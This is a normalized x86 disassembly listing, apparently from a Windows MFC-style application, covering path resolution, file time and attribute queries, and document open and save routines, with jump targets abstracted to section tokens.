test eax eax
jl r-xdata
sub_4447b8
mov eax sub_4648fc
call sub_42dc88
sub esp 0x14c
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
mov esi 0x104
push edi
push esi
push [ ebp + 0xc ]
call [ GetFullPathNameA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
xor esi esi
push eax
push edi
mov [ ebp - 0x4 ] esi
call sub_444888
push esi
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push esi
push esi
push [ ebp + 0x8 ]
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp + 0xc ]
push edi
call [ lstrcpynA@IAT ]
xor eax eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_442148
mov eax esi
test [ ebp - 0x10 ] 0x2
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
test [ ebp - 0x10 ] 0x4
jne r-xdata
push edi
call [ CharUpperA@IAT ]
push 0x1
pop esi
lea eax [ ebp - 0x158 ]
push eax
push [ ebp + 0xc ]
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
push eax
call [ FindClose@IAT ]
lea eax [ ebp - 0x12c ]
push eax
push [ ebp - 0x14 ]
call [ lstrcpyA@IAT ]
sub_444888
mov ecx [ esp + 0x8 ]
push ebx
push esi
mov esi 0x104
push edi
push esi
call sub_442578
xor ebx ebx
mov edi eax
push esi
push ebx
push edi
call sub_42dc30
add esp 0xc
push esi
push [ esp + 0x14 ]
push edi
call [ lstrcpynA@IAT ]
mov cl [ edi ]
mov eax edi
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
mov cl [ edi ]
mov eax edi
inc eax
inc eax
mov cl [ eax + 0x1 ]
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
jne r-xdata
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
je r-xdata
push eax
call sub_42e14b
pop ecx
mov cl [ eax ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
push 0xffffffff
call sub_4425c7
pop edi
pop esi
pop ebx
retn 0x8
mov [ eax + 0x1 ] bl
cmp cl 0x2f
je r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
push eax
call sub_42e14b
pop ecx
cmp cl 0x2f
je r-xdata
cmp cl bl
je r-xdata
push eax
call sub_42e14b
pop ecx
mov cl [ eax ]
jmp r-xdata
cmp cl 0x5c
je r-xdata
push eax
call sub_42e14b
pop ecx
jmp r-xdata
cmp cl bl
je r-xdata
cmp cl 0x2f
jne r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
sub_44494e
push ebp
mov ebp esp
sub esp 0x618
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push 0x2a
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push 0x1
pop eax
mov esi [ lstrlenA@IAT ]
push edi
call esi
push [ ebp + 0xc ]
mov ebx eax
call esi
cmp ebx eax
jne r-xdata
call [ GetThreadLocale@IAT ]
mov esi [ GetStringTypeExA@IAT ]
mov ebx eax
lea eax [ ebp - 0x208 ]
push eax
push 0xffffffff
push edi
push 0x1
push ebx
call esi
lea eax [ ebp - 0x410 ]
push eax
push 0xffffffff
push edi
push 0x4
push ebx
call esi
lea eax [ ebp - 0x618 ]
push eax
push 0xffffffff
push [ ebp + 0xc ]
push 0x1
push ebx
call esi
cmp [ edi ] 0x0
mov eax edi
je r-xdata
xor esi esi
inc esi
push eax
inc esi
call sub_42e14b
cmp [ eax ] 0x0
pop ecx
jne r-xdata
mov cx [ ebp + esi - 0x208 ]
cmp cx [ ebp + esi - 0x618 ]
jne r-xdata
test [ ebp + esi - 0x410 ] 0x80
je r-xdata
sub_444a11
push ebp
mov ebp esp
sub esp 0x104
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
mov esi edi
jne r-xdata
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call GetFileTitleA
test ax ax
je r-xdata
lea esi [ ebp - 0x104 ]
mov [ ebp + 0x10 ] 0x104
test edi edi
jne r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_4562a4
jmp r-xdata
xor eax eax
push esi
call [ lstrlenA@IAT ]
inc eax
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_444a67
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi 0x104
lea eax [ ebp - 0x104 ]
push esi
push eax
push [ ebp + 0x8 ]
call [ GetModuleFileNameA@IAT ]
mov ecx [ ebp + 0xc ]
push esi
push esi
call sub_442578
push eax
lea eax [ ebp - 0x104 ]
push eax
call [ GetShortPathNameA@IAT ]
test eax eax
pop esi
jne r-xdata
mov ecx [ ebp + 0xc ]
push 0xffffffff
call sub_4425c7
leave
retn 0x8
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call sub_4422d1
sub_444ae2
mov eax sub_464918
call sub_42dc88
push ecx
mov eax [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
test eax eax
mov edi 0xf1a0
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x10 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_441ebd
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx edi
mov [ eax ] ecx
mov eax [ esi + 0x8 ]
push [ ebp + 0x10 ]
add eax edi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_44af4d
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x10 ]
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push 0xf006
lea ecx [ ebp + 0x10 ]
call sub_4437c6
sub_444b82
mov eax sub_464940
call sub_42dc88
push ecx
push ecx
push esi
push 0x14
call sub_441e89
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_442f71
mov eax [ rw-data ]
lea ecx [ esi + 0x10 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0xc ] eax
call sub_4422d1
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x10 ]
push r--data
push eax
mov [ ebp - 0x10 ] esi
call sub_42dca7
pop esi
sub_444bed
mov eax [ esp + 0x4 ]
mov ecx 0x10b
cmp eax ecx
ja r-xdata
sub eax 0x3e3
je r-xdata
je r-xdata
push 0xa
dec eax
je r-xdata
push 0x3
jmp r-xdata
cmp eax 0x3e
ja r-xdata
dec eax
je r-xdata
pop eax
cmp eax 0x6b
ja r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
mov ecx 0x90
cmp eax ecx
ja r-xdata
je r-xdata
push 0x8
jmp r-xdata
cmp eax 0x19
ja r-xdata
push 0x5
jmp r-xdata
push 0x1
jmp r-xdata
mov ecx 0xb6
cmp eax ecx
ja r-xdata
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x47
ja r-xdata
cmp eax 0x27
ja r-xdata
je r-xdata
sub eax 0xb7
je r-xdata
je r-xdata
cmp eax 0x75
ja r-xdata
sub eax 0x50
je r-xdata
je r-xdata
add eax 0xffffffcc
cmp eax 0x8
ja r-xdata
je r-xdata
push 0x9
jmp r-xdata
cmp eax 0x18
ja r-xdata
sub eax 0x8
je r-xdata
push 0x6
jmp r-xdata
sub eax 0x91
je r-xdata
sub eax 0x7b
je r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
sub eax 0x40
je r-xdata
jmp [ eax * 4 + jump_table_444e47 ]
push 0xd
jmp r-xdata
cmp eax 0x20
ja r-xdata
jmp [ eax * 4 + jump_table_444de3 ]
dec eax
dec eax
je r-xdata
push 0x7
jmp r-xdata
sub eax 0x9
je r-xdata
dec eax
je r-xdata
sub eax 0x6c
je r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
sub eax 0x21
je r-xdata
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
jmp r-xdata
sub eax 0xd
je r-xdata
sub eax 0x7
je r-xdata
dec eax
je r-xdata
push 0xc
jmp r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
push 0xb
jmp r-xdata
sub eax 0x1a
je r-xdata
retn 0x4
dec eax
dec eax
jne r-xdata
sub eax 0x6
je r-xdata
sub eax 0x6
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
je r-xdata
dec eax
dec eax
je r-xdata
dec eax
je r-xdata
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
dec eax
je r-xdata
jmp r-xdata
dec eax
jne r-xdata
dec eax
jne r-xdata
jmp r-xdata
push 0xe
jmp r-xdata
sub_444e6b
mov eax sub_4649c3
call sub_42dc88
sub esp 0x120
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x12c ]
push esi
push eax
call sub_444f9e
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x1
mov eax 0x100
pop esi
lea ecx [ ebp - 0x10 ]
push eax
push eax
mov [ ebp - 0x4 ] esi
call sub_442578
push eax
lea eax [ ebp - 0x11a ]
push eax
call sub_4562a4
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_4425c7
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_441ebd
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_444eed
mov eax sub_4649ef
call sub_42dc88
sub esp 0x120
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x12c ]
push esi
push eax
call sub_444f9e
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x1
mov eax 0x100
pop esi
lea ecx [ ebp - 0x10 ]
push eax
push eax
mov [ ebp - 0x4 ] esi
call sub_442578
push eax
lea eax [ ebp - 0x11a ]
push eax
call sub_444a11
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_4425c7
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_441ebd
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_444f6f
push ebp
mov ebp esp
sub esp 0x11c
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x11c ]
push eax
call sub_444f9e
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10a ]
push eax
call sub_4421b6
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_444f9e
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x118
push 0x0
mov edi ecx
push esi
call sub_42dc30
add esp 0xc
lea eax [ esi + 0x12 ]
push 0x104
push [ edi + 0xc ]
push eax
call [ lstrcpynA@IAT ]
mov eax [ edi + 0x4 ]
or ebx 0xffffffff
cmp eax ebx
je r-xdata
push 0x1
pop eax
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push eax
call [ GetFileTime@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
push [ edi + 0x4 ]
call [ GetFileSize@IAT ]
cmp eax ebx
mov [ esi + 0xc ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edi [ edi + 0xc ]
cmp [ edi - 0x8 ] 0x0
jne r-xdata
push edi
call [ GetFileAttributesA@IAT ]
cmp eax ebx
je r-xdata
and [ esi + 0x10 ] 0x0
jmp r-xdata
mov [ esi + 0x10 ] al
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b677
mov eax [ eax ]
push ebx
mov [ esi ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b677
mov eax [ eax ]
push ebx
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b677
mov eax [ eax ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] eax
sub_445078
push ebp
mov ebp esp
sub esp 0x140
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
lea edi [ esi + 0x12 ]
push edi
call sub_4447b8
test eax eax
jne r-xdata
lea eax [ ebp - 0x140 ]
push eax
push [ ebp + 0x8 ]
call [ FindFirstFileA@IAT ]
or edi 0xffffffff
cmp eax edi
jne r-xdata
and [ edi ] al
jmp r-xdata
push eax
call [ FindClose@IAT ]
mov al [ ebp - 0x140 ]
push edi
and al 0x7f
lea ecx [ ebp + 0x8 ]
mov [ esi + 0x10 ] al
mov eax [ ebp - 0x120 ]
mov [ esi + 0xc ] eax
lea eax [ ebp - 0x13c ]
push eax
call sub_43b677
mov eax [ eax ]
push edi
mov [ esi ] eax
lea eax [ ebp - 0x134 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b677
mov eax [ eax ]
push edi
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x12c ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b677
mov eax [ eax ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
pop edi
pop esi
leave
retn 0x8
push 0x1
pop eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] eax
sub_44512a
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push esi
mov ecx edi
call sub_43b6c3
mov eax [ eax + 0x14 ]
push esi
add eax 0x76c
mov ecx edi
mov [ ebp - 0x18 ] ax
call sub_43b6c3
mov eax [ eax + 0x10 ]
push esi
inc eax
mov ecx edi
mov [ ebp - 0x16 ] ax
call sub_43b6c3
mov ax [ eax + 0xc ]
push esi
mov ecx edi
mov [ ebp - 0x12 ] ax
call sub_43b6c3
mov ax [ eax + 0x8 ]
push esi
mov ecx edi
mov [ ebp - 0x10 ] ax
call sub_43b6c3
mov ax [ eax + 0x4 ]
push esi
mov ecx edi
mov [ ebp - 0xe ] ax
call sub_43b6c3
mov ax [ eax ]
mov [ ebp - 0xa ] si
mov [ ebp - 0xc ] ax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
mov edi [ GetLastError@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
call [ LocalFileTimeToFileTime@IAT ]
test eax eax
jne r-xdata
push esi
call edi
push eax
call sub_444ac1
pop edi
pop esi
leave
retn
push esi
call edi
push eax
call sub_444ac1
sub_4451dd
push ebx
push esi
push edi
or ebx 0xffffffff
call sub_4428ff
mov esi eax
call sub_45357b
push [ esp + 0x1c ]
mov edi [ eax + 0x4 ]
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push [ esp + 0x1c ]
call sub_456124
test eax eax
je r-xdata
call sub_45b41b
pop edi
mov eax ebx
pop esi
pop ebx
retn 0x10
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x84 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x54 ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x68 ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x58 ]
mov ebx eax
sub_4452fb
mov eax sub_46394c
call sub_42dc88
push ecx
push ecx
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
mov esi [ edi + 0x64 ]
mov [ ebp - 0x10 ] ebx
cmp esi ebx
mov [ ebp - 0x14 ] ebx
je r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x6c ]
mov esi eax
mov [ ebp - 0x14 ] 0x1
mov eax [ esi ]
mov ecx esi
call [ eax + 0x90 ]
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
push 0xffffffff
push ebx
push 0xf104
call sub_4496ef
jmp r-xdata
xor eax eax
jmp r-xdata
call sub_420710
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov ebx [ esi + 0x48 ]
and [ esi + 0x48 ] 0x0
mov eax [ edi ]
push 0x0
push esi
mov ecx edi
call [ eax + 0x70 ]
test eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x48 ] ebx
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
cmp esi ebx
jne r-xdata
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bc5
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x4 ] ebx
call [ eax + 0x58 ]
mov ebx eax
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0x5c ]
mov eax [ esi ]
push [ ebp + 0x8 ]
mov ecx esi
call [ eax + 0x74 ]
test eax eax
jne r-xdata
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x84 ]
cmp [ ebp + 0xc ] ebx
jne r-xdata
xor ebx ebx
push 0xffffffff
push eax
push 0xf104
call sub_4496ef
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
jmp r-xdata
mov eax [ esi ]
push 0x1
push [ ebp + 0x8 ]
mov ecx esi
call [ eax + 0x54 ]
or [ ebp - 0x4 ] 0xffffffff
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bda
xor ebx ebx
cmp [ ebp - 0x14 ] eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x70 ]
test eax eax
jne r-xdata
mov [ esi + 0x4c ] 0x1
push [ ebp + 0xc ]
mov eax [ edi ]
mov ecx edi
push esi
push [ ebp - 0x10 ]
call [ eax + 0x74 ]
mov eax esi
cmp [ eax + 0x1c ] ebx
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x58 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov eax [ ecx ]
call [ eax + 0x58 ]
jmp r-xdata
call sub_4428ff
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x1c ] ecx
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x84 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x70 ]
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x5c ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bda
mov ecx [ ebp - 0x10 ]
mov eax [ ecx ]
call [ eax + 0x58 ]
jmp r-xdata
sub_4454a8
mov eax sub_463960
call sub_42dc88
push ecx
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
push 0x1
push edx
call [ eax + 0x64 ]
test eax eax
je r-xdata
push 0xf003
lea ecx [ ebp - 0x10 ]
call sub_4437c6
mov eax [ ebp - 0x10 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push [ ebp - 0x10 ]
mov eax [ ecx ]
call [ eax + 0x50 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_445509
mov eax sub_4639ee
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_44195c
mov eax [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x1c ] eax
mov eax [ rw-data ]
mov [ esi + 0x20 ] eax
push 0xa
lea ecx [ esi + 0x28 ]
mov [ ebp - 0x4 ] 0x2
call sub_43cdcd
and [ esi + 0x24 ] 0x0
and [ esi + 0x44 ] 0x0
mov ecx [ ebp - 0xc ]
and [ esi + 0x4c ] 0x0
mov [ esi + 0x48 ] 0x1
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_445563
mov eax sub_463a21
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x3
call sub_4455ce
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
lea ecx [ esi + 0x28 ]
mov [ ebp - 0x4 ] 0x2
call sub_43ce2c
lea ecx [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x1c ]
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_441976
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
push esi
call [ eax + 0x60 ]
sub_4455ce
push esi
mov esi ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
pop esi
retn
push edi
lea edi [ esi + 0x28 ]
mov ecx edi
call sub_43cf19
and [ eax + 0x3c ] 0x0
cmp [ esi + 0x34 ] 0x0
jne r-xdata
pop edi
sub_445626
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi ]
call [ eax + 0x60 ]
xor ebx ebx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x8 ] ebx
call [ eax + 0x60 ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx esi
call [ eax + 0x64 ]
mov edi eax
push [ edi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
mov eax [ esi ]
push 0x1
pop ebx
mov ecx esi
call [ eax + 0x60 ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx esi
call [ eax + 0x64 ]
mov edi eax
push [ edi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov ecx edi
call sub_43fcfb
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx esi
call [ eax + 0x64 ]
mov edi eax
push [ edi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov ecx edi
call sub_43fcfb
cmp eax ebx
je r-xdata
or [ eax + 0x40 ] 0xffffffff
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx edi
call sub_43fcfb
test eax eax
je r-xdata
cmp [ eax + 0x40 ] 0xffffffff
jne r-xdata
cmp [ eax + 0x40 ] ebx
jne r-xdata
inc [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x40 ] ecx
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx + 0xe0 ]
inc ebx
and [ eax + 0x40 ] 0x0
sub_445713
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x60 ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x90 ]
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx esi
call [ eax + 0x64 ]
mov ecx eax
call sub_43fcfb
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0x40 ] 0x0
jg r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
leave
retn 0x4
sub_44575f
push ebp
mov ebp esp
sub esp 0x204
push esi
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
mov esi ecx
push eax
call sub_4447b8
lea edi [ esi + 0x20 ]
lea eax [ ebp - 0x104 ]
push eax
mov ecx edi
call sub_4422d1
and [ esi + 0x4c ] 0x0
lea eax [ ebp - 0x204 ]
push 0x100
push eax
lea eax [ ebp - 0x104 ]
push eax
call sub_444a11
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x204 ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
pop edi
pop esi
leave
retn 0x8
mov edi [ edi ]
call sub_45357b
mov eax [ eax + 0x4 ]
push edi
mov ecx eax
mov edx [ eax ]
call [ edx + 0x80 ]
sub_445808
push esi
mov esi ecx
push [ esi + 0x20 ]
call [ GetFileAttributesA@IAT ]
test al 0x1
je r-xdata
mov eax [ esi + 0x20 ]
mov edx [ esi ]
push 0x1
push eax
mov ecx esi
call [ edx + 0x98 ]
mov eax [ esi ]
push 0x1
push 0x0
mov ecx esi
call [ eax + 0x98 ]
jmp r-xdata
push 0x1
pop eax
pop esi
retn
pop esi
retn
test eax eax
jne r-xdata
sub_445843
mov eax sub_463a44
call sub_42dc88
sub esp 0xc
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_4421b6
mov eax [ ebp - 0x14 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ eax - 0x8 ] ebx
jne r-xdata
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bc5
mov eax [ esi ]
push [ ebp - 0x14 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call [ eax + 0x78 ]
test eax eax
jne r-xdata
mov edi [ esi + 0x24 ]
lea eax [ esi + 0x20 ]
push eax
lea ecx [ ebp - 0x14 ]
call sub_442281
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
call sub_45357b
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
neg ecx
sbb ecx ecx
push edi
and ecx 0xfffffffd
push ebx
add ecx 0xf004
push 0x804
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx eax
call sub_44ab0d
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax - 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] bl
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bda
push 0x1
pop esi
mov eax [ esi ]
push 0x1
push [ ebp - 0x14 ]
mov ecx esi
call [ eax + 0x54 ]
mov [ ebp - 0x4 ] bl
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bda
jmp r-xdata
push [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x3
call sub_44447e
jmp r-xdata
xor esi esi
jmp r-xdata
lea eax [ esi + 0x1c ]
lea ecx [ ebp - 0x14 ]
push eax
call sub_442281
push r--data
lea ecx [ ebp - 0x14 ]
call sub_44265c
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0x2
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
mov eax [ rw-data ]
mov [ ebp - 0x18 ] eax
mov eax [ edi ]
lea ecx [ ebp - 0x18 ]
push 0x4
push ecx
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x64 ]
test eax eax
je r-xdata
push eax
lea ecx [ ebp - 0x14 ]
call sub_4425c7
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] bl
call sub_442148
mov eax [ ebp - 0x18 ]
